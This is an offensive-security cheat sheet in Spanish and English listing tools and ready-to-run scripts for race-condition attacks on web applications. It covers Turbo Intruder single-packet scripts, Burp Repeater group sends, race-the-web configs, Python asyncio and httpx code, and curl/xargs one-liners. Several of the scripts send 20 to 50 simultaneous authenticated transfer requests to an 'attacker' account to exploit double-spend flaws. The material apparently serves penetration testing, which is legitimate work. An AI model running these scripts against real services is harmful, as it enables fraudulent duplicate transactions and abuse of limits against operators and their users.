---
aliases:
  - Turbo Intruder Race
  - race-the-web
  - asyncio race
tags:
  - vuln/race-condition
  - technique/initial-access
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Race Conditions]]"
  - "[[Burp Suite]]"
---
# Race Conditions - Tooling

***

## Turbo Intruder (Burp)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Burp → Extensions → BApp Store → search "Turbo Intruder" → Install | Install Turbo Intruder extension | Pre-attack. |
| Right-click Repeater request → "Extensions" → "Send to turbo intruder" | Send request to Turbo Intruder | UI workflow. |
| Script: `engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)` | HTTP/2 single-packet engine | Single-Packet Attack. |
| Script: `engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=False)` | HTTP/1.1 last-byte sync (Pre-2023) | Pipelining race. |
| Script: `engine.queue(target.req)` x 20 | Queue N copies of base request | Single packet payload. |
| Script: `engine.queue(target.req, payload)` with `wordlists.clipboard` | Inject wordlist payload per request | Param-varying race. |
| `def handleResponse(req, interesting): if req.status != 401: table.add(req)` | Filter responses to table | Visual triage. |
| Script `engine.stop()` (en handleResponse) | Stop early on first success | Race confirmed. |
| Script `engine.start(timeout=10)` | Start race con timeout | Bounded run. |
| Top-right "Attack" button → run | Execute race attack | Trigger. |
| Burp Extensions → Turbo Intruder → Open "examples/race-single-packet-attack.py" | Built-in template script | Starting point. |
| Right-click cell in result table → "Save selected requests" | Export hits for replay | Reportable. |
^race-tool-turbo

### Script Turbo Intruder race básico (single-packet)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    req = '''POST /api/transfer HTTP/2
host: target.com
cookie: session=...
content-type: application/json

{"to":"attacker","amount":100}'''

    for _ in range(20):
        engine.queue(req)

def handleResponse(req, interesting):
    table.add(req)
```

___

## Burp Repeater "Send Group → Single Connection"

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Right-click Repeater tab → "Create tab group" → name "race" | Create tab group for race | Setup. |
| Drag Repeater tabs into "race" group | Add tabs to group | Group population. |
| Right-click group tab → "Send group (single connection)" | Send all tabs in one TCP connection | HTTP/1.1 race. |
| Right-click group tab → "Send group (in parallel)" (Burp Pro 2024+) | Single-packet HTTP/2 parallel | HTTP/2 race precision. |
| Each tab → modify `cookie:` / body per tab | Per-request distinct params | Compound race. |
| Burp Repeater HTTP/2 inspector panel | Manual H2 frame inspection | Frame-level debug. |
| Settings → Network → "Use HTTP/2" force | Force HTTP/2 protocol | H2 race. |
| Right-click → "Save to project" → save tab group | Persist group config | Repeatable. |
| Ctrl+R (send) on each tab simultaneously | Manual fallback no-group | Pre-2022 Burp. |
| Burp Macros → Sessions → setup pre-auth refresh | Pre-auth before race | Auth required. |
^race-tool-burp-repeater

___

## race-the-web

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `go install github.com/insp3ctre/race-the-web@latest` | Install Go-based race tool | Setup. |
| `race-the-web -c config.toml` | Run con TOML config | Standard run. |
| Config TOML: `[[requests]] verb="POST" url="https://target/api/transfer" body='{"amount":100}' count=30` | Declarative N requests config | Config format. |
| `race-the-web -c config.toml -verbose` | Verbose debug output | Debug. |
| `race-the-web -c config.toml --proxy http://127.0.0.1:8080` | Route via Burp proxy | Inspect. |
| `race-the-web -c config.toml -o results.json` | JSON output | Reportable. |
| TOML `[connection] workers = 100` | High concurrency workers | Speed. |
| TOML `[connection] timeout = 5` | Per-request timeout | Tuning. |
| `race-the-web -h` | List config options | Reference. |
| TOML `[[requests]] cookie = "session=ABC"` | Auth header inject | Auth required. |
^race-tool-rtw

___

## Python asyncio / aiohttp / httpx

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pip install aiohttp httpx[http2]` | Install async HTTP libs | Setup. |
| `python3 -c "import asyncio,aiohttp; async def r(s): return await s.post('https://target/api/x', cookies={'session':'X'}); asyncio.run((lambda: [asyncio.gather(*[r(s) for _ in range(50)]) for s in [aiohttp.ClientSession()]])()[0])"` | One-liner 50 parallel requests | Quick race. |
| `python3 race_async.py` (con `asyncio.gather` over N tasks) | Standard asyncio race script | Standard pattern. |
| `python3 -c "import asyncio,httpx; async def r(): async with httpx.AsyncClient(http2=True) as c: return await asyncio.gather(*[c.post('https://target/api/x',cookies={'session':'X'},json={'amount':100}) for _ in range(20)]); print(asyncio.run(r()))"` | httpx HTTP/2 race | Modern HTTP/2. |
| `aiohttp.TCPConnector(limit=1)` con asyncio.gather | Force single TCP connection | Pipeline race. |
| `aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None))` | Unlimited concurrent connections | Volume race. |
| `python3 -m asyncio` (REPL) | Interactive async REPL | Quick test. |
| `httpx.AsyncClient(http2=True, verify=False)` | HTTPS sin verify (self-signed) | Internal. |
| Script `await asyncio.sleep(0.5); await race(...)` | Delayed race | Timing tune. |
| `python3 -m pip install trio` y `trio.run(...)` | Alt async runtime | Stylistic alt. |
| `pip install h2 && python3 race_h2.py` (raw h2 lib) | Raw HTTP/2 frame control | Low-level frame race. |
^race-tool-python

### Script Python asyncio race

```python
import asyncio
import aiohttp

async def race(session, url, payload, sem):
    async with sem:
        async with session.post(url, json=payload, cookies={'session':'...'}) as resp:
            return resp.status, await resp.text()

async def main():
    sem = asyncio.Semaphore(20)
    async with aiohttp.ClientSession() as session:
        tasks = [
            race(session, 'https://target/api/transfer',
                 {'to':'attacker','amount':100}, sem)
            for _ in range(20)
        ]
        results = await asyncio.gather(*tasks)
        for status, body in results:
            print(status, len(body))

asyncio.run(main())
```

### HTTP/2 con httpx

```python
import asyncio
import httpx

async def race():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [
            client.post('https://target/api/transfer',
                        json={'to':'attacker','amount':100},
                        cookies={'session':'...'})
            for _ in range(20)
        ]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code)

asyncio.run(race())
```

___

## Otros Tools y Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `git clone https://github.com/Raz0r/RaceForce && python3 RaceForce/raceforce.py` | RaceForce Python tester | Standalone. |
| `go install github.com/lcvvvv/grace@latest && grace -url https://target/api/x -n 30 -h2` | gRace Go HTTP/2 race tool | Modern Go. |
| `seq 1 30 \| xargs -P 30 -I{} curl -s -X POST -b "session=X" -d "amount=100" https://target/api/transfer` | Bash + xargs quick race | Quick CLI. |
| `wrk -c 30 -t 30 -d 5s -s post.lua https://target/api/transfer` | wrk stress race (Lua scripted) | Stress test. |
| `echo 'POST https://target/api/transfer\n@payload.json' \| vegeta attack -rate=50/s -duration=5s \| vegeta report` | vegeta HTTP load tester | HTTP race. |
| `hey -m POST -c 30 -n 30 -H "Cookie: session=X" -d 'amount=100' https://target/api/transfer` | Hey concurrent baseline | Concurrent. |
| `siege -c 30 -r 1 'https://target/api/transfer POST {"amount":100}'` | Siege stress | Race-ish stress. |
| `locust -f locustfile.py --headless -u 30 -r 30 -t 5s --host https://target` | Locust distributed load | Distributed. |
| `for i in {1..30}; do (curl -s -X POST -b "session=X" -d "amount=100" https://target/api/transfer &); done; wait` | Pure Bash parallel | Quick & dirty. |
| Burp Intruder → attack type "Sniper" + 50 threads + null payload | Burp Intruder approximation | Pre-Turbo fallback. |
| Browser DevTools → Network → "Block request" + replay → manual race | Manual browser race | Edge UI. |
| `apt install apache2-utils && ab -n 30 -c 30 -p body.json -T 'application/json' -C 'session=X' https://target/api/transfer` | Apache Bench | Concurrent baseline. |
^race-tool-others

***
